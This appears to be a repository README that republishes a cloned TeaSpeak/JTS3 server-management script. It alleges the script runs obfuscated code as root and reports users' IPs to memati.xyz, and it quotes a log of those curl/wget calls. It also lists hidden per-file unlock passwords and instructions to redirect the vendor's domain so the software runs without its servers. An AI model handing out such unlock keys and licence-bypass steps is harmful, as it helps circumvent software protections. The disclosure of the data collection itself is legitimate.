# SpecialScriptPWN3D

Releasing all files that SpecialScript scripts uses & downloads.

Basicly using this script will compromise your system & data, due to encrypted bash code and you have to login as root to run script. Yeah even your passwd could be changeable ;)

##### NOTE THAT: 

This repository is entire clone of SpecialScript script&file servers. 

You can clone everything except README.md to use script without any connection to SpecialScript servers.
 
#### Redirect memati.xyz to YOURIP or YOURSITE and be sure directory structure is correct with my repo. Put all files at / on webserver.

#### They still changing your hosts file to remove their block but im sure you will find a way (like i do).

## More Deep

They compiled every bash file to obfuscate their code. And if you try to run Special-library with only ./Special-library you will get this:



```bash
This file can only be opened by special script IP address has been forwarded to MeMaTi.

Bu Dosya Sadece Special Script Tarafından Açılabilir İp Adresiniz MeMaTi ye İletildi.
```
So how to do? Each file have unique password to run. All of them hidden inside Special .


#### Long story short. Mark them as executable first.

| Script Name  | Run Command  | Description |
| :------------ |:---------------:| ----- |
|Special-libraryen|./Special-libraryen jts3kur|Install JTS3|
|Special-libraryen|./Special-libraryen teayonet|Control TeaSpeak Server|
|Special-libraryen|./Special-libraryen specialsec|Control Special Bot|
|Special-libraryen|./Special-libraryen jts3yonet|Control JTS3|
|Special-libraryen|./Special-libraryen proxy|Proxy Menu|
|Special-libraryen|./Special-libraryen webssh|WebSSH Menu|

#

 Turkish version below


| Script Name  | Run Command  | Description |
| :------------ |:---------------:| ----- |
|teastart| ./teastart -gg memati start|Start TeaSpeak Server|
|Special-library|./Special-library jts3kur|Install JTS3|
|Special-library|./Special-library teayonet|Control TeaSpeak Server|
|Special-library|./Special-library specialsec|Control Special Bot|
|Special-library|./Special-library jts3yonet|Control JTS3|
|Special-library|./Special-library proxy|Proxy Menu|
|Special-library|./Special-library webssh|WebSSH Menu|

ALERT: All files does lot of sensitive info (of yours) transfer with memati.xyz . Redirect them to be %100 safe. 

## Whats going on ??

Simple, they check ur data and geolocate you. Even restrict your IP for no reason.

Log of Special

```
curl -s -4 memati.xyz/Special/ipcek.php
wget memati.xyz/panel/ban/0.0.0.0.php -q -O -
curl -s -N -4 --head --request GET memati.xyz/Special/durum.php
grep 200 OK
curl -s -N -4 --head --request GET memati.xyz/panel/ban/0.0.0.0.php
grep 200 OK

sleep 0.01
curl --data tur=join&ip=0.0.0.0 memati.xyz/sistem/islem.php
clear

su root -c echo -e '\033[1;33mBu Dosya Sadece Special Script Tarafından Açılabilir İp Adresiniz MeMaTi ye İletildi.\033[0m'
bash -c echo -e '\033[1;33mBu Dosya Sadece Special Script Tarafından Açılabilir İp Adresiniz MeMaTi ye İletildi.\033[0m'
curl --data tur=hata&ip=0.0.0.0 memati.xyz/sistem/islem.php
```

# COURTESY OF BYGALACOS


## License
I dont have any, like they dont...
